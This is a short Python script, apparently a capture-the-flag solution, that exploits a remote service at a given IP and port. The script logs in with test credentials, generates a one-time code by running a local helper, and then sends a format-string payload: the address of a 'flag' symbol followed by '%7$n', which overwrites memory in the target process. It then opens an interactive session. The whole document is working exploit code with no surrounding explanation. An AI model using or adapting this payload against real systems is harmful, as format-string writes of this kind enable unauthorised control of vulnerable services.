from ptrlib import *
import subprocess

elf = ELF("./binary")

def getOTP():
    t = subprocess.check_output(["./ctime"])
    return int(t)

#sock = Process("./binary")
sock = Socket("185.66.87.233", 5002)
sock.recvuntil("Login: ")
sock.sendline("test_account")
sock.recvuntil("Password: ")
sock.sendline("test_password")
otp = getOTP()
sock.recvuntil("code: ")
sock.sendline(str(otp))
sock.recvuntil("> ")
sock.sendline("2")
sock.recvuntil("> ")
sock.send(p32(elf.symbol("flag")) + b"%7$n")
sock.interactive()
